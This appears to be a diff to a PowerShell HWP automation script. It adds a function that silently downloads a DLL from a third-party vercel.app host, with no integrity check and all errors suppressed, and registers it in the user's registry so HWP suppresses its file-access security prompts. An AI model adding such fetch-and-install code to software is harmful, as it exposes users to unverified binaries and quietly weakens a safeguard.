@@ -38,6 +38,22 @@ function Fit-Width($h) {
   try { $p = $h.HParameterSet.HViewProperties; [void]$h.HAction.GetDefault('ViewZoom', $p.HSet); $p.ZoomType = 2; [void]$h.HAction.Execute('ViewZoom', $p.HSet) } catch {}
 }
 
+# 한컴 보안 모듈(FilePathCheckerModule.dll)을 내려받아 레지스트리에 등록 (한 번만)
+function Ensure-Module {
+  try {
+    $dir = Join-Path $env:LOCALAPPDATA 'siddhartha'; New-Item -ItemType Directory -Force -Path $dir | Out-Null
+    $dll = Join-Path $dir 'FilePathCheckerModule.dll'
+    if (-not (Test-Path $dll) -or (Get-Item $dll).Length -lt 100000) {
+      [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+      Invoke-WebRequest -UseBasicParsing -Uri 'https://rosy-phi-35.vercel.app/desktop/FilePathCheckerModule.dll' -OutFile $dll
+    }
+    foreach ($k in @('HKCU:\Software\HNC\HwpAutomation\Modules', 'HKCU:\Software\Hnc\HwpUserAction\Modules')) {
+      if (-not (Test-Path $k)) { New-Item -Path $k -Force | Out-Null }
+      Set-ItemProperty -Path $k -Name 'FilePathCheckerModule' -Value $dll
+    }
+  } catch {}
+}
+
 function Get-Hwp {
   if ($script:hwp) {
     $alive = $false
@@ -45,8 +61,9 @@ function Get-Hwp {
     if ($alive) { return $script:hwp }
     $script:hwp = $null; $script:embedded = [IntPtr]::Zero
   }
+  Ensure-Module
   $h = New-Object -ComObject 'HWPFrame.HwpObject'
-  # 파일 열 때마다 뜨는 "접근 허용" 창을 줄이는 보안 모듈 (없으면 그냥 넘어감)
+  # 파일 열고 저장할 때마다 뜨는 "접근 허용" 창을 없애는 한컴 보안 모듈
   try { [void]$h.RegisterModule('FilePathCheckDLL', 'FilePathCheckerModule') } catch {}
   try { $h.XHwpWindows.Item(0).Visible = $true } catch {}
   $script:hwp = $h
